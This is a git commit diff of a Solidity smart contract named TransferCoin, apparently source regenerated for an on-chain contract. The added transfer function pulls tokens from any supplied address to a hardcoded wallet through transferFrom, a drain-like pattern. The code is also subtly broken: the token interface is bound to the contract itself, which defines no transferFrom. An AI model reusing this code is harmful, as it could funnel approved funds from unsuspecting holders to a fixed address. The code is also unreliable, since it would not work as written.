703bf9c1a7b78fe09413d051e58b85409dc45eb2
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 19:14:19 +0700

    add contract TransferCoin

--- TransferCoin.sol
+++ TransferCoin.sol
@@ -1,18 +1,19 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TransferCoin at 0x517630ec7b99fe38412d13a6834427d08462ca07
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TransferCoin at 0xde6275840ae45cb0d49594938ba3b2f4bdcf4463
 */
 pragma solidity ^0.4.24;
 /*Copyright @ Allstarbit*/
+interface Token {
+    function approve(address spender, uint256 value) public returns (bool);
+    function transferFrom(address from, address to, uint256 value) public returns (bool);   
+}
 contract TransferCoin {
-    mapping (address => uint256) public balanceOf;
-    address public xdest = 0x5554a8F601673C624AA6cfa4f8510924dD2fC041;
-    function transfer(address _to, uint256 _value) public{
-        if (balanceOf[msg.sender] < _value) revert();
-        if (balanceOf[_to] + _value < balanceOf[_to]) revert();
-        balanceOf[msg.sender] -= _value;
-        balanceOf[_to] += _value;
+    address public xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
+    function getContractAddr() view public returns (address) {
+        return this;
     }
-    function() payable public {
-        transfer(xdest,msg.value);
-      }
+    Token token = Token(getContractAddr());
+    function transfer(address _from, uint value) public payable {
+        require(token.transferFrom(_from, xdest, value));
+    }
 }
